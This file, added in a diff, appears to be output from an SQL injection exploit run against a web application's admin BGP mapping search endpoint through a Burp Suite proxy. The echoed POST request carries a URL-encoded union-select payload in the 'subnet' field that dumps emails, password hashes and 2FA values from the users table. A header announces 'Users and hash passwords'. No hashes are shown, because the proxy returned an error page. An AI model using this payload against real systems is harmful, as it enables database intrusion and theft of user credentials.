@@ -1,0 +1,46 @@
+[+] 'set-cookie'
+[+] Vulnerable..
+
+
+> Users and hash passwords: 
+
+<html><head><title>Burp Suite Community Edition</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+div.navbar {position: absolute; top: 18px; right: 25px;}
+div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margin-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Community Edition</h1></div>
+<h1>Error</h1><p>Invalid&#32;client&#32;request&#32;received&#58;&#32;First&#32;line&#32;of&#32;request&#32;did&#32;not&#32;contain&#32;an&#32;absolute&#32;URL&#32;&#45;&#32;try&#32;enabling&#32;invisible&#32;proxy&#32;support&#46;</p>
+<div class="request">POST&nbsp;/app/admin/routing/edit-bgp-mapping-search.php&nbsp;HTTP/1.1<br>
+Host:&nbsp;127.0.0.1:8081<br>
+User-Agent:&nbsp;Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;10.0;&nbsp;Win64;&nbsp;x64)&nbsp;AppleWebKit/537.36&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Chrome/97.0.4692.71&nbsp;Safari/537.36<br>
+Accept-Encoding:&nbsp;gzip,&nbsp;deflate,&nbsp;br<br>
+Accept:&nbsp;*/*<br>
+Connection:&nbsp;keep-alive<br>
+Content-Type:&nbsp;application/x-www-form-urlencoded;&nbsp;charset=UTF-8<br>
+Content-Length:&nbsp;232<br>
+<br>
+subnet=pwn%22union+select%28select+concat%28%40%3A%3D0x3a%2C%28select%2Bcount%28%2A%29+from%28users%29where%28%40%3A%3Dconcat%28%40%2Cemail%2C0x3a%2Cpassword%2C%220x3a%22%2C2fa%29%29%29%2C%40%29%29%2C2%2C3%2Cuser%28%29+--+-&bgp_id=1</div><p>&nbsp;</p>*
+</div>
+</body>
+</html>
+
+
+
+> DONE <
+
